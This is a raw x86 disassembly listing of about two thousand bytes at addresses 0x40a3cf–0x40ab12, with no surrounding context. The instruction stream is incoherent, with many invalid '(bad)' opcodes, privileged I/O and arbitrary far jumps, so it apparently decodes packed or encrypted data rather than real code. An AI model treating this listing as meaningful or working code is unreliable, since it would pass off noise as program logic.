  40a3cf:	sub    bl,BYTE PTR [edi-0x10]
  40a3d2:	inc    edi
  40a3d3:	or     BYTE PTR [edi+0x76],ah
  40a3d6:	pop    eax
  40a3d7:	xchg   ebx,eax
  40a3d8:	and    BYTE PTR [edi+ebx*4+0x6e30b027],dl
  40a3df:	xor    BYTE PTR [eax+0x26],dl
  40a3e2:	cdq    
  40a3e3:	addr16 mov eax,0x942501b1
  40a3e9:	jecxz  0x40a448
  40a3eb:	in     al,dx
  40a3ec:	cld    
  40a3ed:	sti    
  40a3ee:	jl     0x40a3d8
  40a3f0:	inc    ebx
  40a3f1:	daa    
  40a3f2:	call   0xe5769fee
  40a3f7:	xchg   DWORD PTR ds:0x6055fb5,eax
  40a3fd:	inc    ecx
  40a3fe:	ret    0x6eef
  40a401:	xlat   BYTE PTR ds:[ebx]
  40a402:	sub    eax,0x5f7bfec3
  40a407:	clc    
  40a408:	arpl   WORD PTR [esi],bp
  40a40a:	pop    esp
  40a40b:	leave  
  40a40c:	cmp    bl,dh
  40a40e:	rol    BYTE PTR [edi],0x18
  40a411:	ins    DWORD PTR es:[edi],dx
  40a412:	sahf   
  40a413:	mov    eax,ds:0xa946d83b
  40a418:	ss xchg ebp,eax
  40a41a:	push   DWORD PTR [ebp-0x40e4b57]
  40a420:	pop    esi
  40a421:	xor    eax,0xa851aed0
  40a426:	stos   BYTE PTR es:[edi],al
  40a427:	mov    dl,0x88
  40a429:	mov    ebp,ss
  40a42b:	call   0xc00c:0xf19b134d
  40a432:	inc    esp
  40a433:	jmp    0x40a435
  40a435:	cli    
  40a436:	dec    ecx
  40a437:	inc    eax
  40a438:	je     0x40a49b
  40a43a:	sbb    DWORD PTR [edx+esi*2-0x4b0c8ca],esi
  40a441:	and    DWORD PTR [edi+0x75],0xcb9c6047
  40a448:	ror    ah,1
  40a44a:	jo     0x40a440
  40a44c:	jb     0x40a467
  40a44e:	mov    eax,0xefaee2b1
  40a453:	mov    ebx,DWORD PTR [edi+eax*4]
  40a456:	add    DWORD PTR [eax+eax*8-0x2d7b4ff2],esp
  40a45d:	test   DWORD PTR [ecx-0x6953261c],esi
  40a463:	iret   
  40a464:	ins    BYTE PTR es:[edi],dx
  40a465:	lods   eax,DWORD PTR ds:[esi]
  40a466:	or     edx,ebx
  40a468:	dec    eax
  40a469:	sub    DWORD PTR [ecx+0x18d5e7cf],ebx
  40a46f:	out    0x55,eax
  40a471:	pandn  mm7,mm4
  40a474:	jge    0x40a4ad
  40a476:	cmp    edi,DWORD PTR [edi+0x1f194299]
  40a47c:	mov    bl,0xca
  40a47e:	or     al,0xb8
  40a480:	pop    ss
  40a481:	fcmovu st,st(7)
  40a483:	add    al,0xb6
  40a485:	stos   BYTE PTR es:[edi],al
  40a486:	mov    esp,0x482118b5
  40a48b:	test   DWORD PTR [ebx],ecx
  40a48d:	pop    ebp
  40a48e:	pop    esi
  40a48f:	mov    edx,0xea641b7c
  40a494:	cld    
  40a495:	push   ss
  40a496:	(bad)  
  40a498:	sti    
  40a499:	sbb    ebp,DWORD PTR [ebx-0x6f]
  40a49c:	(bad)  
  40a49d:	(bad)  
  40a49e:	in     al,dx
  40a49f:	retf   0x7385
  40a4a2:	leave  
  40a4a3:	bound  edx,QWORD PTR [ecx]
  40a4a5:	pop    eax
  40a4a6:	sbb    al,0x63
  40a4a8:	jmp    0x7684:0xbdfa1374
  40a4af:	dec    ebx
  40a4b0:	xchg   edx,eax
  40a4b1:	adc    eax,0x8aca35da
  40a4b6:	push   esi
  40a4b7:	pop    es
  40a4b8:	(bad)  
  40a4b9:	adc    bh,bl
  40a4bb:	in     al,dx
  40a4bc:	and    bh,bl
  40a4be:	scas   al,BYTE PTR es:[edi]
  40a4bf:	fisub  WORD PTR [ebp+0x11]
  40a4c2:	shl    DWORD PTR [ebp+0x51],1
  40a4c5:	das    
  40a4c6:	pop    ebx
  40a4c7:	sbb    ebp,DWORD PTR [esp+edx*1-0x29]
  40a4cb:	inc    edi
  40a4cc:	xor    BYTE PTR ds:0x4dfde3e2,ch
  40a4d2:	pop    ebx
  40a4d3:	loope  0x40a522
  40a4d5:	mov    edx,edx
  40a4d7:	mov    bl,0xa
  40a4d9:	fdivr  QWORD PTR [ecx]
  40a4db:	mov    esp,0xacf0032f
  40a4e0:	and    DWORD PTR [edi+esi*2+0x3e],ebp
  40a4e4:	or     BYTE PTR [ebx],ah
  40a4e6:	adc    eax,0xb22948ba
  40a4eb:	push   ss
  40a4ec:	fldcw  WORD PTR [eiz*2-0x4d36b4c2]
  40a4f3:	xchg   esp,eax
  40a4f4:	jl     0x40a564
  40a4f6:	sub    DWORD PTR [edi],ecx
  40a4f8:	mov    edi,0x6a7fc7cd
  40a4fd:	(bad)  
  40a4fe:	into   
  40a4ff:	mov    ds,WORD PTR [ebx]
  40a501:	in     al,0x13
  40a503:	addr16 cli 
  40a505:	xor    eax,0xedc6f987
  40a50a:	mov    ds:0xa6970d99,eax
  40a50f:	sub    DWORD PTR [ecx-0x66],ebp
  40a512:	xacquire xchg DWORD PTR [edi-0x2],ebx
  40a516:	sbb    bl,bh
  40a518:	jl     0x40a4fb
  40a51a:	adc    bl,BYTE PTR [ebx-0x59]
  40a51d:	sahf   
  40a51e:	bound  esi,QWORD PTR [ebx-0x5]
  40a521:	sbb    al,0x1b
  40a523:	fwait
  40a524:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a525:	dec    eax
  40a526:	rcr    DWORD PTR [esi+0x7d],cl
  40a529:	enter  0x472e,0x58
  40a52d:	dec    esp
  40a52e:	aad    0xf9
  40a530:	loop   0x40a551
  40a532:	mov    edx,DWORD PTR [edi]
  40a534:	push   ebp
  40a535:	mov    ebp,0xae5cbd72
  40a53a:	inc    esi
  40a53b:	push   es
  40a53c:	push   esi
  40a53d:	pop    eax
  40a53e:	cdq    
  40a53f:	adc    eax,0xf86fed
  40a544:	mov    WORD PTR [esi],?
  40a546:	je     0x40a582
  40a548:	push   ebx
  40a549:	xchg   edi,eax
  40a54a:	inc    ebx
  40a54b:	xchg   edx,eax
  40a54c:	sbb    eax,0x4700026d
  40a551:	cdq    
  40a552:	add    BYTE PTR [edi+0x72],ch
  40a555:	lahf   
  40a556:	push   edi
  40a557:	add    ecx,DWORD PTR [edx+0xc38e5]
  40a55d:	shr    BYTE PTR [esi],0x53
  40a560:	xor    al,0x89
  40a562:	dec    esp
  40a563:	pop    edx
  40a564:	mov    WORD PTR [edi-0x22],gs
  40a567:	test   al,0x7a
  40a569:	clc    
  40a56a:	push   ebp
  40a56b:	pop    esi
  40a56c:	(bad)  
  40a56e:	ins    BYTE PTR es:[edi],dx
  40a56f:	js     0x40a598
  40a571:	jb     0x40a59a
  40a573:	jo     0x40a5dd
  40a575:	add    al,0x9d
  40a578:	inc    eax
  40a579:	and    eax,0xd68b16de
  40a57e:	call   0x8e3e:0xf23cf22
  40a585:	mov    esi,0x86b5852b
  40a58a:	sub    edx,DWORD PTR [edi+0x6e]
  40a58d:	arpl   bp,sp
  40a58f:	jbe    0x40a526
  40a591:	add    al,0x24
  40a593:	inc    ebp
  40a594:	sbb    cl,dh
  40a596:	push   ss
  40a597:	(bad)  
  40a598:	and    eax,0xad84e3f8
  40a59d:	cmp    ah,ah
  40a59f:	ror    dl,1
  40a5a1:	sbb    al,0xb3
  40a5a3:	pop    ss
  40a5a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5a5:	mov    DWORD PTR [edx+0x77684dd7],esp
  40a5ab:	adc    al,0x49
  40a5ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5ae:	leave  
  40a5af:	dec    ebp
  40a5b0:	in     al,0x68
  40a5b2:	or     edx,DWORD PTR [edx]
  40a5b4:	(bad)  
  40a5b5:	(bad)  
  40a5b6:	xchg   edi,eax
  40a5b7:	xchg   edx,eax
  40a5b8:	js     0x40a57c
  40a5ba:	cmp    DWORD PTR [ebx+0x2bbf715a],ebp
  40a5c0:	adc    dl,cl
  40a5c2:	xor    al,0x21
  40a5c4:	and    ah,BYTE PTR [edi+0x63]
  40a5c7:	int    0xbe
  40a5c9:	(bad)  
  40a5ca:	jge    0x40a5cd
  40a5cc:	loope  0x40a5ea
  40a5ce:	xchg   esi,eax
  40a5cf:	inc    ebp
  40a5d0:	or     edx,DWORD PTR [edi]
  40a5d2:	rol    edi,1
  40a5d4:	jmp    FWORD PTR [esi+0x3eea9bca]
  40a5da:	sub    eax,0xca1a5d16
  40a5df:	pop    esp
  40a5e0:	push   ebx
  40a5e1:	in     al,0x5
  40a5e3:	inc    ebp
  40a5e4:	sahf   
  40a5e5:	xchg   edx,eax
  40a5e6:	sub    DWORD PTR [bx-0x5045],eax
  40a5eb:	repz xchg ecx,eax
  40a5ed:	mul    DWORD PTR [edi]
  40a5ef:	pushf  
  40a5f0:	cmp    DWORD PTR [ebp+0x77ff7b5d],edi
  40a5f6:	jmp    0x40a5ed
  40a5f8:	inc    ebx
  40a5f9:	add    dl,BYTE PTR [eax-0x28]
  40a5fc:	sahf   
  40a5fd:	and    al,0x9
  40a5ff:	mov    ebp,0x5f178f5e
  40a604:	jl     0x40a58f
  40a606:	das    
  40a607:	jge    0x40a5ee
  40a609:	inc    ebp
  40a60a:	mov    edx,0xdad987c3
  40a60f:	jns    0x40a5a1
  40a611:	loope  0x40a5f9
  40a613:	imul   edi,DWORD PTR [edx],0x54c20d9d
  40a619:	fdivrp st(1),st
  40a61b:	sub    edx,DWORD PTR [ebx]
  40a61d:	ficom  WORD PTR [esi-0x71]
  40a620:	mov    bh,0x55
  40a622:	mov    ch,0xb5
  40a624:	retf   0x82c2
  40a627:	and    eax,0xeb655ec5
  40a62c:	push   edi
  40a62d:	scas   al,BYTE PTR es:[edi]
  40a62e:	nop
  40a62f:	inc    esi
  40a630:	in     eax,dx
  40a631:	xchg   DWORD PTR [eax],ecx
  40a633:	nop
  40a634:	mov    esi,esp
  40a636:	add    dl,ah
  40a638:	ds pop es
  40a63a:	mov    al,ds:0xa6c48495
  40a63f:	in     eax,0xec
  40a641:	mov    edi,0x72c3df0
  40a646:	mov    dh,0x22
  40a648:	fwait
  40a649:	cmc    
  40a64a:	retf   0xfdaf
  40a64d:	fisubr DWORD PTR [edi-0x86f23cb]
  40a653:	dec    edi
  40a654:	mov    es,WORD PTR [ebx]
  40a656:	add    BYTE PTR [edx],ah
  40a658:	and    BYTE PTR [edi+0x6d],dl
  40a65b:	inc    eax
  40a65c:	xchg   BYTE PTR [eax+0x23],dh
  40a65f:	mov    edi,0x95af5d0a
  40a664:	adc    BYTE PTR [edx+0x63eb6309],ch
  40a66a:	je     0x40a6a7
  40a66c:	stos   BYTE PTR es:[edi],al
  40a66d:	idiv   DWORD PTR [edi-0x45]
  40a670:	mov    dh,0xfc
  40a672:	popf   
  40a673:	in     al,0xb8
  40a675:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a676:	inc    eax
  40a677:	mov    ds:0x20516514,al
  40a67c:	arpl   WORD PTR [edi],bx
  40a67e:	xor    BYTE PTR [edi+0x3e],0xcd
  40a682:	out    0x73,eax
  40a684:	scas   al,BYTE PTR es:[edi]
  40a685:	pop    ebp
  40a686:	fwait
  40a687:	cmp    BYTE PTR [eax],0x85
  40a68a:	inc    eax
  40a68b:	mov    al,ds:0xf9454494
  40a690:	or     esi,eax
  40a692:	iret   
  40a693:	xor    al,0xec
  40a695:	xchg   edx,eax
  40a696:	jnp    0x40a6ae
  40a698:	out    0xad,eax
  40a69a:	sub    DWORD PTR [ecx-0x102e3f8b],edx
  40a6a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6a1:	hlt    
  40a6a2:	mov    ebx,0x4969d309
  40a6a7:	pop    ecx
  40a6a8:	pop    edx
  40a6a9:	mov    WORD PTR [esi-0x2ee3735f],fs
  40a6af:	push   edx
  40a6b0:	ret    
  40a6b1:	stc    
  40a6b2:	loop   0x40a712
  40a6b4:	aas    
  40a6b5:	hlt    
  40a6b6:	loop   0x40a656
  40a6b8:	mov    bh,0x6c
  40a6bb:	mov    ds:0xc6a9da72,al
  40a6c0:	mov    cl,0x2b
  40a6c2:	cmp    al,0x65
  40a6c4:	adc    eax,0x17ef0450
  40a6c9:	sub    al,0x32
  40a6cb:	adc    bl,al
  40a6cd:	in     eax,0xc3
  40a6cf:	jne    0x40a72d
  40a6d1:	jns    0x40a66a
  40a6d3:	jmp    0x374a:0x2c41d6e3
  40a6da:	push   ss
  40a6db:	and    bl,cl
  40a6dd:	loope  0x40a73f
  40a6df:	(bad)  
  40a6e0:	cmp    al,0xef
  40a6e2:	jg     0x40a6c4
  40a6e4:	and    BYTE PTR [edi],0x9f
  40a6e7:	js     0x40a68b
  40a6e9:	pop    edx
  40a6ea:	sub    BYTE PTR [ebx+0x44efb8d9],0xfb
  40a6f1:	add    eax,DWORD PTR [eax-0x816d6b5]
  40a6f7:	sti    
  40a6f8:	fdivr  QWORD PTR [eax-0x2206c87]
  40a6fe:	cld    
  40a6ff:	xor    ebp,DWORD PTR [eax-0x4f]
  40a702:	lds    ebp,FWORD PTR [ecx+0x370c73ad]
  40a708:	jbe    0x40a6f2
  40a70a:	mov    ah,0x86
  40a70c:	cwde   
  40a70d:	push   edx
  40a70e:	and    BYTE PTR [ecx+ebp*4-0x4d5756d7],al
  40a715:	jbe    0x40a6d9
  40a717:	leave  
  40a718:	loop   0x40a6b9
  40a71a:	mov    ch,0x82
  40a71c:	jne    0x40a714
  40a71e:	mov    edi,0x92686cc2
  40a723:	mov    cl,0xf8
  40a725:	dec    ebp
  40a726:	les    edi,FWORD PTR [edi+0xd1bd283]
  40a72c:	cmp    al,BYTE PTR [ebx]
  40a72e:	cmp    eax,0x7a0a7283
  40a733:	cmp    al,0x67
  40a735:	out    0xd1,eax
  40a737:	xchg   esp,eax
  40a738:	and    al,0x49
  40a73a:	xor    DWORD PTR [esi],esp
  40a73c:	pop    ebx
  40a73d:	repnz inc bh
  40a740:	iret   
  40a741:	jle    0x40a797
  40a743:	adc    dl,al
  40a745:	rol    BYTE PTR [ecx],cl
  40a747:	not    DWORD PTR [ecx-0x72]
  40a74a:	arpl   WORD PTR [edx],ax
  40a74c:	pushf  
  40a74d:	push   ss
  40a74e:	inc    edx
  40a74f:	mov    ah,0x57
  40a751:	cmc    
  40a752:	loop   0x40a7ad
  40a754:	scas   al,BYTE PTR es:[edi]
  40a755:	sub    DWORD PTR [edx-0x61],ecx
  40a758:	ret    0x5388
  40a75b:	test   cl,bh
  40a75d:	jl     0x40a7ad
  40a75f:	scas   eax,DWORD PTR es:[edi]
  40a760:	xlat   BYTE PTR ds:[ebx]
  40a761:	inc    edi
  40a762:	sub    edi,esi
  40a764:	repnz div edi
  40a767:	imul   ecx
  40a769:	cmc    
  40a76a:	jp     0x40a721
  40a76c:	jecxz  0x40a6fc
  40a76e:	sbb    esp,DWORD PTR [esi+0x4826555b]
  40a774:	mov    bl,0x4c
  40a776:	ins    BYTE PTR es:[edi],dx
  40a777:	or     bl,ah
  40a779:	test   eax,0x7f298ff7
  40a77e:	clc    
  40a77f:	scas   al,BYTE PTR es:[edi]
  40a780:	lea    eax,[ecx+0x6]
  40a783:	dec    eax
  40a784:	idiv   DWORD PTR [ebp-0x1d2a549a]
  40a78a:	retf   0xb7d5
  40a78d:	fcomp  st(5)
  40a78f:	ja     0x40a75b
  40a791:	and    eax,0xe0123e04
  40a796:	iret   
  40a797:	addr16 push ss
  40a799:	cmp    eax,0x6621158e
  40a79e:	pmaddwd mm6,mm7
  40a7a1:	in     eax,dx
  40a7a2:	jp     0x40a7f2
  40a7a4:	add    DWORD PTR [ebx+edi*1-0x76],esi
  40a7a8:	loope  0x40a75a
  40a7aa:	(bad)
  40a7ad:	and    bl,cl
  40a7af:	xor    eax,0x60673579
  40a7b4:	call   0x7e90ff16
  40a7b9:	jmp    0x40a750
  40a7bb:	xor    DWORD PTR [eax],ebp
  40a7bd:	imul   edx,DWORD PTR [ebp-0x62],0x15
  40a7c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7c2:	inc    eax
  40a7c3:	mov    ds:0x7fc38fa7,eax
  40a7c8:	xor    eax,0xd92363a7
  40a7cd:	daa    
  40a7ce:	div    dl
  40a7d0:	push   edi
  40a7d1:	cmp    al,0x3a
  40a7d3:	push   es
  40a7d4:	add    DWORD PTR [ecx],edx
  40a7d6:	add    DWORD PTR [eax+0x6b40acf],0x30285c6d
  40a7e0:	retf   
  40a7e1:	or     al,0xb3
  40a7e3:	fld    DWORD PTR [ecx]
  40a7e5:	out    0xb6,eax
  40a7e7:	scas   eax,DWORD PTR es:[edi]
  40a7e8:	icebp  
  40a7e9:	ror    DWORD PTR [edi],1
  40a7eb:	mov    edi,0x5dbb7687
  40a7f0:	dec    ebp
  40a7f1:	jo     0x40a7a4
  40a7f3:	jmp    0x413:0x4159367d
  40a7fa:	(bad)  
  40a7fc:	ss repz stc 
  40a7ff:	pushf  
  40a800:	(bad)  
  40a801:	cld    
  40a802:	mov    ecx,0x86e5732f
  40a807:	in     eax,0xcc
  40a809:	mov    ecx,0x4f0e1987
  40a80e:	shr    ebx,1
  40a810:	outs   dx,DWORD PTR ds:[esi]
  40a811:	cmp    DWORD PTR [esi+0x70ceb157],esi
  40a817:	outs   dx,DWORD PTR ds:[esi]
  40a818:	mov    ebp,DWORD PTR [edx]
  40a81a:	test   al,0xba
  40a81c:	out    dx,eax
  40a81d:	clc    
  40a81e:	jp     0x40a7ab
  40a820:	or     edx,edi
  40a822:	mov    bh,0x35
  40a824:	call   0x49b4:0x72fa5898
  40a82b:	popa   
  40a82c:	in     eax,dx
  40a82d:	and    bh,bh
  40a82f:	(bad)  
  40a831:	std    
  40a832:	outs   dx,BYTE PTR ds:[esi]
  40a833:	xor    DWORD PTR [eax+0x165d00a2],edx
  40a839:	or     al,0x7
  40a83b:	lods   eax,DWORD PTR ds:[esi]
  40a83c:	lds    edi,FWORD PTR [edx+edx*4+0x28193976]
  40a843:	mov    WORD PTR [ecx+0x381cb158],es
  40a849:	mov    esp,0xc4818b0b
  40a84e:	jb     0x40a86c
  40a850:	add    BYTE PTR [eax+0x11],ch
  40a853:	jmp    0xe3de:0x951c61aa
  40a85a:	sbb    esp,DWORD PTR [esp+ecx*2]
  40a85d:	mov    esi,0xefc5b4d1
  40a862:	xchg   esi,eax
  40a863:	scas   eax,DWORD PTR es:[edi]
  40a864:	movq   mm3,QWORD PTR [edi]
  40a867:	adc    al,0xee
  40a869:	xor    eax,0xfda7707a
  40a86e:	(bad)  
  40a86f:	sbb    BYTE PTR [edx],cl
  40a871:	arpl   WORD PTR [eax],bp
  40a873:	repnz pushf 
  40a875:	xor    al,0x4d
  40a877:	pop    ebp
  40a878:	scas   al,BYTE PTR es:[edi]
  40a879:	mov    ecx,0x695a89ef
  40a87e:	retf   0x9bad
  40a881:	sti    
  40a882:	sbb    al,0x1e
  40a884:	add    BYTE PTR [edx],dh
  40a886:	dec    esp
  40a887:	add    ah,dl
  40a889:	jge    0x40a88b
  40a88b:	(bad)  
  40a88c:	mov    edi,0x1c45d8d8
  40a891:	adc    al,0x4c
  40a893:	or     BYTE PTR [edi-0x3],cl
  40a896:	pop    esp
  40a897:	(bad)  
  40a898:	sbb    al,0x1c
  40a89a:	test   BYTE PTR [edx],ch
  40a89c:	xchg   ecx,eax
  40a89d:	je     0x40a8da
  40a89f:	or     DWORD PTR [ebp-0x5b1e3d92],edi
  40a8a5:	and    al,0xa7
  40a8a7:	fs in  eax,0x2a
  40a8aa:	ds push ebp
  40a8ac:	outs   dx,DWORD PTR ds:[esi]
  40a8ad:	push   ds
  40a8ae:	fbstp  TBYTE PTR [ebx-0x5d]
  40a8b1:	dec    esp
  40a8b2:	std    
  40a8b3:	or     DWORD PTR [ecx+0x50],ebx
  40a8b6:	cmc    
  40a8b7:	lock fld TBYTE PTR [esi+0x19871ed8]
  40a8be:	pop    ecx
  40a8bf:	ss add eax,0x7e23ec6a
  40a8c5:	test   al,0xd8
  40a8c7:	and    al,0x71
  40a8c9:	or     eax,0x5aef5f17
  40a8ce:	mov    ebx,0xdddbd921
  40a8d3:	push   edi
  40a8d4:	clc    
  40a8d5:	hlt    
  40a8d6:	iret   
  40a8d7:	ds (bad) 
  40a8d9:	jmp    0xdd68d0b1
  40a8de:	je     0x40a8a8
  40a8e0:	inc    edi
  40a8e1:	push   cs
  40a8e2:	aam    0x5a
  40a8e4:	lds    eax,FWORD PTR [eax]
  40a8e6:	ret    0x24ff
  40a8e9:	dec    ecx
  40a8ea:	dec    eax
  40a8eb:	xchg   edx,eax
  40a8ec:	test   BYTE PTR [edi],bh
  40a8ee:	cld    
  40a8ef:	repnz xor edi,DWORD PTR [ebx+edi*8-0x45]
  40a8f4:	xlat   BYTE PTR ds:[ebx]
  40a8f5:	fnstcw WORD PTR [edx]
  40a8f7:	icebp  
  40a8f8:	and    al,0xc3
  40a8fa:	int    0x53
  40a8fc:	or     al,0xaa
  40a8fe:	xor    al,0xdf
  40a900:	fcom   DWORD PTR [esi-0x67104572]
  40a906:	sub    al,0xe1
  40a908:	(bad)  
  40a909:	imul   eax,DWORD PTR [eax+eiz*8],0x33f036c7
  40a910:	or     al,0x6f
  40a912:	data16 loope 0x40a90b
  40a915:	mov    BYTE PTR [esi+0x37],bh
  40a918:	stos   DWORD PTR es:[edi],eax
  40a919:	jbe    0x40a8b0
  40a91b:	cmp    DWORD PTR [ecx],eax
  40a91d:	fimul  WORD PTR [ecx]
  40a91f:	test   al,0x3d
  40a921:	add    ecx,DWORD PTR [eax+0x66d680c2]
  40a927:	and    al,0xca
  40a929:	push   esp
  40a92a:	jae    0x40a97d
  40a92c:	mov    eax,0xe0db9663
  40a931:	jl     0x40a971
  40a933:	pop    edi
  40a934:	in     eax,0x24
  40a936:	mov    bh,0xbc
  40a938:	mov    edx,DWORD PTR [ecx]
  40a93a:	add    BYTE PTR [eax],bh
  40a93c:	sahf   
  40a93d:	or     DWORD PTR [eax-0x4],esp
  40a940:	inc    DWORD PTR [ebp-0x51]
  40a943:	or     DWORD PTR [eax-0x2d792f5b],eax
  40a949:	das    
  40a94a:	jne    0x40a960
  40a94c:	sub    dh,BYTE PTR [eax+0x15]
  40a94f:	mov    ebp,0x7707480b
  40a954:	mov    dh,0xe5
  40a956:	sbb    DWORD PTR [edi+esi*2],0x5f
  40a95a:	jae    0x40a937
  40a95c:	sub    dl,BYTE PTR [esi]
  40a95e:	jo     0x40a907
  40a960:	arpl   WORD PTR [ebp-0xb4d676c],sp
  40a966:	(bad)  [ebp+0x7f57357e]
  40a96c:	dec    DWORD PTR [ecx-0x66]
  40a96f:	jo     0x40a954
  40a971:	out    0x2d,al
  40a973:	push   cs
  40a974:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a975:	ror    BYTE PTR ds:0x12e116e,cl
  40a97b:	sub    BYTE PTR [edx+ebx*1+0x1b87426c],ch
  40a982:	out    dx,al
  40a983:	bswap  edi
  40a985:	add    ch,BYTE PTR [edx]
  40a987:	pop    edi
  40a988:	inc    eax
  40a989:	add    BYTE PTR [eax],cl
  40a98b:	pop    es
  40a98c:	sub    BYTE PTR [edx-0x47],cl
  40a98f:	nop
  40a990:	pusha  
  40a991:	mov    bh,0x93
  40a993:	ror    BYTE PTR [edx+0x25],1
  40a996:	mov    bl,0xc
  40a998:	mov    edi,0x2868815e
  40a99d:	call   0xeb963684
  40a9a2:	push   cs
  40a9a3:	xor    al,0x3d
  40a9a5:	jp     0x40a9b2
  40a9a7:	mov    ch,0x32
  40a9a9:	add    edx,0x23837ec7
  40a9af:	sbb    DWORD PTR [edx+0x74],eax
  40a9b2:	into   
  40a9b3:	fucompp 
  40a9b5:	sbb    bh,BYTE PTR [esi+0x7d31a583]
  40a9bb:	jne    0x40a9ed
  40a9bd:	xor    DWORD PTR [esi+0x60],eax
  40a9c0:	mov    ah,0x61
  40a9c2:	mov    bl,0x73
  40a9c4:	cdq    
  40a9c5:	pop    edi
  40a9c6:	cli    
  40a9c7:	dec    ebx
  40a9c8:	add    ebx,DWORD PTR [esi]
  40a9ca:	jle    0x40a9bc
  40a9cc:	fs aad 0xdb
  40a9cf:	lods   eax,DWORD PTR ds:[esi]
  40a9d0:	pop    edx
  40a9d1:	(bad)  
  40a9d2:	stos   DWORD PTR es:[edi],eax
  40a9d3:	cmp    cl,bl
  40a9d5:	adc    edi,ebx
  40a9d7:	xchg   ebp,eax
  40a9d8:	push   edx
  40a9d9:	mov    ah,0x5a
  40a9db:	sub    eax,0xcbeefc5e
  40a9e0:	jl     0x40a9d3
  40a9e2:	(bad)  
  40a9e3:	mov    esi,0x11e36f43
  40a9e8:	inc    esi
  40a9e9:	pop    ebx
  40a9ea:	sbb    BYTE PTR [si],cl
  40a9ed:	dec    edi
  40a9ee:	xchg   ecx,eax
  40a9ef:	mov    dh,0x17
  40a9f1:	leave  
  40a9f2:	mov    ds:0x77c47a8a,al
  40a9f8:	mov    dh,0x42
  40a9fa:	jae    0x40aa1f
  40a9fc:	push   ebx
  40a9fd:	int3   
  40a9fe:	xchg   BYTE PTR [ebp+0x62],ch
  40aa01:	push   ecx
  40aa02:	(bad)  
  40aa03:	aad    0xa8
  40aa05:	test   DWORD PTR [eax+0x7d8b6f],edi
  40aa0b:	push   ecx
  40aa0c:	mov    ch,0xad
  40aa0e:	xchg   edx,eax
  40aa0f:	push   0x49
  40aa11:	jo     0x40a9ce
  40aa13:	mov    al,0xff
  40aa15:	dec    ebx
  40aa16:	or     eax,0x96ed2509
  40aa1b:	hlt    
  40aa1c:	mov    ?,ecx
  40aa1e:	sbb    BYTE PTR [eax-0x6b99b65e],dh
  40aa24:	bound  esi,QWORD PTR [edi+0x77]
  40aa27:	ja     0x40aa7e
  40aa29:	sbb    dh,BYTE PTR [eax+0x1]
  40aa2c:	pop    esp
  40aa2d:	pop    ecx
  40aa2e:	jge    0x40a9f5
  40aa30:	sti    
  40aa31:	and    ebp,DWORD PTR [edi-0x75]
  40aa34:	add    DWORD PTR [esi+edi*1+0x0],edx
  40aa38:	scas   eax,DWORD PTR es:[edi]
  40aa39:	lock pop ecx
  40aa3b:	loope  0x40aa89
  40aa3d:	cmp    BYTE PTR [eax-0xbef7b92],0x7a
  40aa44:	cmp    eax,0x28a12492
  40aa49:	or     ah,BYTE PTR [esi]
  40aa4b:	xchg   ebx,eax
  40aa4c:	or     DWORD PTR [ebx+0x2e9ee8d1],esp
  40aa52:	je     0x40aab0
  40aa54:	pop    edi
  40aa55:	rcr    BYTE PTR [ebp+0x4a77ff3c],0xe
  40aa5c:	push   0xffffff9e
  40aa5e:	dec    edi
  40aa5f:	or     BYTE PTR [ecx-0x17],al
  40aa62:	pop    es
  40aa63:	cmp    DWORD PTR [ecx+0x636a0873],eax
  40aa69:	call   0x6b598622
  40aa6e:	js     0x40aa53
  40aa70:	int    0xeb
  40aa72:	call   0xbbab32e9
  40aa77:	clc    
  40aa78:	jg     0x40aa42
  40aa7a:	add    DWORD PTR [eax+0x4e100604],esi
  40aa80:	jmp    0x810a:0x918a9a7a
  40aa87:	fwait
  40aa88:	sub    eax,eax
  40aa8a:	sub    DWORD PTR [edx+0x68],edx
  40aa8d:	ins    BYTE PTR es:[edi],dx
  40aa8e:	lods   eax,DWORD PTR ds:[esi]
  40aa8f:	mov    dh,0x4b
  40aa91:	pmaxsw mm3,QWORD PTR [esi]
  40aa94:	and    al,0x4c
  40aa96:	and    ax,0x3585
  40aa9a:	pusha  
  40aa9b:	jecxz  0x40ab16
  40aa9d:	add    ah,BYTE PTR [edx+0xfa6fbfc]
  40aaa3:	pusha  
  40aaa4:	aad    0x1a
  40aaa6:	xor    DWORD PTR ds:0x5dff805f,0xb
  40aaad:	or     esi,DWORD PTR [esi]
  40aaaf:	fadd   DWORD PTR [ebx+esi*8+0x1c]
  40aab3:	push   ebp
  40aab4:	scas   eax,DWORD PTR es:[edi]
  40aab5:	out    dx,eax
  40aab6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aab7:	adc    eax,0x1845cdaf
  40aabc:	fisttp DWORD PTR [esi]
  40aabe:	jbe    0x40ab31
  40aac0:	mov    esp,0xd6b6414f
  40aac5:	rcl    BYTE PTR [esi+0x7],1
  40aac8:	jl     0x40aab0
  40aaca:	addr16 data16 cld 
  40aacd:	fsub   QWORD PTR [edi]
  40aacf:	jle    0x40aa73
  40aad1:	mov    ds:0x70274dfe,al
  40aad6:	nop
  40aad7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aad8:	shr    DWORD PTR [edi+0x4e9dfca9],cl
  40aade:	xchg   DWORD PTR [ebx-0x69],ecx
  40aae1:	scas   al,BYTE PTR es:[edi]
  40aae2:	lock pop ds
  40aae4:	(bad)  
  40aae5:	repz push edi
  40aae7:	enter  0x16f5,0x67
  40aaeb:	mov    bh,0x1e
  40aaed:	pusha  
  40aaee:	xor    BYTE PTR [eax],bh
  40aaf0:	inc    ebp
  40aaf1:	stos   DWORD PTR es:[edi],eax
  40aaf2:	mov    ebp,0xeab23181
  40aaf7:	ins    BYTE PTR es:[edi],dx
  40aaf8:	sub    dh,BYTE PTR [esi-0x3ce293d1]
  40aafe:	push   esi
  40aaff:	mov    dl,0x8d
  40ab01:	pop    edx
  40ab02:	or     esp,DWORD PTR [ebp+0x51]
  40ab05:	ins    BYTE PTR es:[edi],dx
  40ab06:	rcr    esp,0x16
  40ab09:	ins    DWORD PTR es:[edi],dx
  40ab0a:	mov    eax,ds:0xdfb5037a
  40ab0f:	cmc    
  40ab10:	adc    ebp,DWORD PTR [esi]
  40ab12:	stos   BYTE PTR es:[edi],al
